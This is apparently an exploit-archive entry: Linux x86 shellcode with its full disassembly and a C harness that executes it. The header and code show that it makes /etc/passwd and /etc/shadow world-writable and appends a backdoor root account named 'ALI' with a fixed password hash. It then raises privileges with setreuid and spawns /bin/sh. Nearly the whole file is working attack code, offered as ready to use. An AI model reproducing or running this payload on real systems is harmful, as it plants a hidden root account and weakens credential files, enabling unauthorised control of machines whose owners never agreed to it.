/*# Exploit Title: Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Execute /bin/sh
# Date: 4/8/2014
# Exploit Author: Ali Razmjoo
# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]
*/
/*
Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com
Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh
length: 378 bytes
chmod('/etc/passwd',777)
chmod('/etc/shadow',777)
open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd
setreuid() , execve('/bin/sh')


00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	31 db                	xor    %ebx,%ebx
   4:	6a 0f                	push   $0xf
   6:	58                   	pop    %eax
   7:	68 6a 73 77 64       	push   $0x6477736a
   c:	5b                   	pop    %ebx
   d:	c1 eb 08             	shr    $0x8,%ebx
  10:	53                   	push   %ebx
  11:	68 2f 70 61 73       	push   $0x7361702f
  16:	68 2f 65 74 63       	push   $0x6374652f
  1b:	89 e3                	mov    %esp,%ebx
  1d:	68 41 41 ff 01       	push   $0x1ff4141
  22:	59                   	pop    %ecx
  23:	c1 e9 08             	shr    $0x8,%ecx
  26:	c1 e9 08             	shr    $0x8,%ecx
  29:	cd 80                	int    $0x80
  2b:	6a 0f                	push   $0xf
  2d:	58                   	pop    %eax
  2e:	68 6a 64 6f 77       	push   $0x776f646a
  33:	5b                   	pop    %ebx
  34:	c1 eb 08             	shr    $0x8,%ebx
  37:	53                   	push   %ebx
  38:	68 2f 73 68 61       	push   $0x6168732f
  3d:	68 2f 65 74 63       	push   $0x6374652f
  42:	89 e3                	mov    %esp,%ebx
  44:	68 41 41 ff 01       	push   $0x1ff4141
  49:	59                   	pop    %ecx
  4a:	c1 e9 08             	shr    $0x8,%ecx
  4d:	c1 e9 08             	shr    $0x8,%ecx
  50:	cd 80                	int    $0x80
  52:	6a 05                	push   $0x5
  54:	58                   	pop    %eax
  55:	68 41 73 77 64       	push   $0x64777341
  5a:	5b                   	pop    %ebx
  5b:	c1 eb 08             	shr    $0x8,%ebx
  5e:	53                   	push   %ebx
  5f:	68 2f 70 61 73       	push   $0x7361702f
  64:	68 2f 65 74 63       	push   $0x6374652f
  69:	89 e3                	mov    %esp,%ebx
  6b:	68 41 41 01 04       	push   $0x4014141
  70:	59                   	pop    %ecx
  71:	c1 e9 08             	shr    $0x8,%ecx
  74:	c1 e9 08             	shr    $0x8,%ecx
  77:	cd 80                	int    $0x80
  79:	89 c3                	mov    %eax,%ebx
  7b:	6a 04                	push   $0x4
  7d:	58                   	pop    %eax
  7e:	68 41 73 68 0a       	push   $0xa687341
  83:	59                   	pop    %ecx
  84:	c1 e9 08             	shr    $0x8,%ecx
  87:	51                   	push   %ecx
  88:	68 6e 2f 62 61       	push   $0x61622f6e
  8d:	68 3a 2f 62 69       	push   $0x69622f3a
  92:	68 72 6f 6f 74       	push   $0x746f6f72
  97:	68 4c 49 3a 2f       	push   $0x2f3a494c
  9c:	68 3a 30 3a 41       	push   $0x413a303a
  a1:	68 4b 2e 3a 30       	push   $0x303a2e4b
  a6:	68 66 77 55 57       	push   $0x57557766
  ab:	68 68 70 31 50       	push   $0x50317068
  b0:	68 7a 59 65 41       	push   $0x4165597a
  b5:	68 41 61 41 51       	push   $0x51416141
  ba:	68 49 38 75 74       	push   $0x74753849
  bf:	68 50 4d 59 68       	push   $0x68594d50
  c4:	68 54 42 74 7a       	push   $0x7a744254
  c9:	68 51 2f 38 54       	push   $0x54382f51
  ce:	68 45 36 6d 67       	push   $0x676d3645
  d3:	68 76 50 2e 73       	push   $0x732e5076
  d8:	68 4e 58 52 37       	push   $0x3752584e
  dd:	68 39 4b 55 48       	push   $0x48554b39
  e2:	68 72 2f 59 42       	push   $0x42592f72
  e7:	68 56 78 4b 47       	push   $0x474b7856
  ec:	68 39 55 66 5a       	push   $0x5a665539
  f1:	68 46 56 6a 68       	push   $0x686a5646
  f6:	68 46 63 38 79       	push   $0x79386346
  fb:	68 70 59 6a 71       	push   $0x716a5970
 100:	68 77 69 53 68       	push   $0x68536977
 105:	68 6e 54 67 54       	push   $0x5467546e
 10a:	68 58 4d 69 37       	push   $0x37694d58
 10f:	68 2f 41 6e 24       	push   $0x246e412f
 114:	68 70 55 6e 4d       	push   $0x4d6e5570
 119:	68 24 36 24 6a       	push   $0x6a243624
 11e:	68 41 4c 49 3a       	push   $0x3a494c41
 123:	89 e1                	mov    %esp,%ecx
 125:	ba 41 41 41 7f       	mov    $0x7f414141,%edx
 12a:	c1 ea 08             	shr    $0x8,%edx
 12d:	c1 ea 08             	shr    $0x8,%edx
 130:	c1 ea 08             	shr    $0x8,%edx
 133:	cd 80                	int    $0x80
 135:	31 c0                	xor    %eax,%eax
 137:	b0 46                	mov    $0x46,%al
 139:	31 db                	xor    %ebx,%ebx
 13b:	31 c9                	xor    %ecx,%ecx
 13d:	cd 80                	int    $0x80
 13f:	31 c0                	xor    %eax,%eax
 141:	b0 46                	mov    $0x46,%al
 143:	31 db                	xor    %ebx,%ebx
 145:	31 c9                	xor    %ecx,%ecx
 147:	cd 80                	int    $0x80
 149:	68 59 59 59 59       	push   $0x59595959
 14e:	68 58 58 58 58       	push   $0x58585858
 153:	68 2f 73 68 42       	push   $0x4268732f
 158:	68 2f 62 69 6e       	push   $0x6e69622f
 15d:	89 e3                	mov    %esp,%ebx
 15f:	31 c0                	xor    %eax,%eax
 161:	88 43 07             	mov    %al,0x7(%ebx)
 164:	89 5b 08             	mov    %ebx,0x8(%ebx)
 167:	89 43 0c             	mov    %eax,0xc(%ebx)
 16a:	b0 0b                	mov    $0xb,%al
 16c:	8d 4b 08             	lea    0x8(%ebx),%ecx
 16f:	8d 53 0c             	lea    0xc(%ebx),%edx
 172:	cd 80                	int    $0x80
 174:	b0 01                	mov    $0x1,%al
 176:	b3 01                	mov    $0x1,%bl
 178:	cd 80                	int    $0x80

*/

#include <stdio.h>
#include <string.h>
char sc[] = "\x31\xc0\x31\xdb\x6a\x0f\x58\x68\x6a\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x0f\x58\x68\x6a\x64\x6f\x77\x5b\xc1\xeb\x08\x53\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x05\x58\x68\x41\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\x68\x6e\x2f\x62\x61\x68\x3a\x2f\x62\x69\x68\x72\x6f\x6f\x74\x68\x4c\x49\x3a\x2f\x68\x3a\x30\x3a\x41\x68\x4b\x2e\x3a\x30\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\x68\x41\x4c\x49\x3a\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x59\x59\x59\x59\x68\x58\x58\x58\x58\x68\x2f\x73\x68\x42\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
int main(void)
{

    fprintf(stdout,"Length: %d\n\n",strlen(sc));

    (*(void(*)()) sc)();

}